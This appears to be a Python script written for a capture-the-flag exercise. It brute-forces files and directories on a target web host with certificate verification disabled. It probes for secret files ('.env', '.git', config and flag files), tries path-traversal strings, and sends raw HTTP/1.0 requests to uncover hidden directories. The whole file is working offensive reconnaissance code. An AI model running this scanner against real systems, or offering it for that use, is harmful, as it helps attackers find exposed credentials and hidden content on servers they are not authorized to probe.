import urllib.request
import urllib.error
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

base = 'https://web-17e4256823c5a05c.web.h7tex.com/boardroom'

# Try many filenames common for AV/streaming scenarios
filenames = [
    'index.html', 'index.htm', 'stream', 'stream.mp3', 'stream.wav', 'stream.ogg',
    'stream.flac', 'stream.pcm', 'stream.raw', 'stream.aac', 'stream.m4a',
    'live', 'live.mp3', 'live.wav', 'live.ogg', 'feed', 'feed.mp3', 'feed.wav',
    'audio', 'audio.mp3', 'audio.wav', 'audio.ogg', 'audio.raw', 'audio.pcm',
    'bridge', 'bridge.mp3', 'bridge.wav', 'meeting', 'meeting.mp3', 'meeting.wav',
    'recording', 'recording.mp3', 'recording.wav', 'capture', 'capture.wav',
    'flag', 'flag.txt', 'secret', 'secret.txt', 'data', 'data.bin', 'output',
    'config', 'config.json', 'config.yaml', 'config.yml', 'settings',
    'app.py', 'main.py', 'server.py', 'stream.py', 'README', 'README.md',
    '.env', '.git', '.gitignore', 'Dockerfile', 'docker-compose.yml',
    'requirements.txt', 'Makefile', 'package.json',
    'video', 'video.mp4', 'video.webm', 'video.mkv', 'cam', 'camera',
    'mic', 'mic.wav', 'mic.mp3', 'mic.raw', 'microphone',
    'speaker', 'speaker.wav', 'speaker.mp3',
    'room', 'room.wav', 'room.mp3', 'room.raw',
    'av', 'av.mp3', 'av.wav', 'av-bridge', 'av_bridge',
    'exfil', 'leak', 'secrets', 'key', 'private',
    'whisper', 'noise', 'signal', 'channel',
    'pcap', 'traffic.pcap', 'capture.pcap', 'network.pcap',
    'transcript', 'transcript.txt', 'log', 'log.txt', 'access.log',
    'notes', 'notes.txt', 'minutes', 'minutes.txt',
    'broadcast', 'broadcast.mp3', 'broadcast.wav',
    'playlist', 'playlist.m3u', 'playlist.m3u8', 'playlist.pls',
    'manifest.mpd', 'master.m3u8', 'index.m3u8', 'chunklist.m3u8',
    'segment', 'chunk', 'media.m3u8',
    # HLS segments
    'segment0.ts', 'segment1.ts', 'chunk0.ts', 'chunk1.ts',
    'media0.ts', 'media1.ts', '0.ts', '1.ts',
    # MPEG-DASH
    'init.mp4', 'init.m4s', 'segment0.m4s', 'segment1.m4s',
    # WebM live
    'live.webm', 'stream.webm',
    # Common API paths
    'api', 'v1', 'v2', 'status', 'health', 'info', 'metadata',
    'ws', 'websocket', 'socket', 'rtc', 'webrtc', 'signaling',
    # dotfiles  
    '.htaccess', '.well-known',
    # Python SimpleHTTP may reveal parent with traversal
    '../', '..%2f',
]

# Also try subdirectories 
subdirs = ['stream', 'audio', 'media', 'av', 'live', 'api', 'static',
           'assets', 'public', 'data', 'files', '.well-known']

all_paths = []
for f in filenames:
    all_paths.append(f'{base}/{f}')
for sd in subdirs:
    all_paths.append(f'{base}/{sd}/')

found = []

def check(url):
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=5)
        return (url, resp.status, resp.headers.get('Content-Type'), len(resp.read()))
    except urllib.error.HTTPError as e:
        if e.code != 404:
            return (url, e.code, e.headers.get('Content-Type', ''), 0)
        return None
    except Exception:
        return None

with ThreadPoolExecutor(max_workers=20) as ex:
    futures = {ex.submit(check, u): u for u in all_paths}
    for f in as_completed(futures):
        r = f.result()
        if r:
            found.append(r)
            print(f"  [HIT] {r[0]} -> {r[1]} ({r[2]}, {r[3]} bytes)")

if not found:
    print("No files found in /boardroom/")
else:
    print(f"\nTotal hits: {len(found)}")

# Also try the HTTP/1.0 trick that revealed /boardroom - check other top-level dirs
import socket
import ssl as sslmod

print("\n=== Checking for more top-level directories (HTTP/1.0 + 301 check) ===")
sctx = sslmod.create_default_context()
sctx.check_hostname = False
sctx.verify_mode = sslmod.CERT_NONE

# Wider directory scan - look for 301s which indicate directories
dirs_to_check = [
    'admin', 'api', 'app', 'assets', 'audio', 'av', 'backend', 'bin',
    'bridge', 'broadcast', 'camera', 'capture', 'cdn', 'channel', 'client',
    'config', 'console', 'ctrl', 'data', 'debug', 'dev', 'dist', 'docs',
    'download', 'exfil', 'export', 'feed', 'file', 'files', 'flag', 'frontend',
    'gateway', 'handler', 'home', 'hook', 'hub', 'img', 'internal', 'js',
    'leak', 'lib', 'listen', 'live', 'log', 'logs', 'main', 'media',
    'meeting', 'mic', 'monitor', 'mount', 'mux', 'net', 'node_modules',
    'out', 'output', 'pcap', 'pipe', 'portal', 'private', 'proxy', 'public',
    'raw', 'record', 'recording', 'relay', 'remote', 'room', 'rtmp', 'rtp',
    'secret', 'secrets', 'serve', 'server', 'signal', 'sink', 'sip',
    'source', 'speaker', 'src', 'static', 'status', 'storage', 'stream',
    'sub', 'sys', 'system', 'target', 'temp', 'test', 'tmp', 'tool',
    'tools', 'trace', 'trunk', 'upload', 'upstream', 'user', 'usr',
    'v1', 'v2', 'video', 'voice', 'web', 'websocket', 'ws', 'www',
    '.git', '.well-known', '_debug', '__debug__', 'healthz', 'readyz',
]

def check_dir(dirname):
    try:
        s = socket.create_connection(('web-17e4256823c5a05c.web.h7tex.com', 443), timeout=3)
        ss = sctx.wrap_socket(s, server_hostname='web-17e4256823c5a05c.web.h7tex.com')
        req = f"GET /{dirname} HTTP/1.0\r\nHost: web-17e4256823c5a05c.web.h7tex.com\r\n\r\n"
        ss.sendall(req.encode())
        resp = ss.recv(512)
        ss.close()
        status = resp.split(b'\r\n')[0].decode()
        if '301' in status:
            return (dirname, status)
        elif '200' in status:
            return (dirname, status)
        return None
    except Exception:
        return None

with ThreadPoolExecutor(max_workers=20) as ex:
    futures = {ex.submit(check_dir, d): d for d in dirs_to_check}
    for f in as_completed(futures):
        r = f.result()
        if r:
            print(f"  [DIR] /{r[0]} -> {r[1]}")

print("\nDone.")
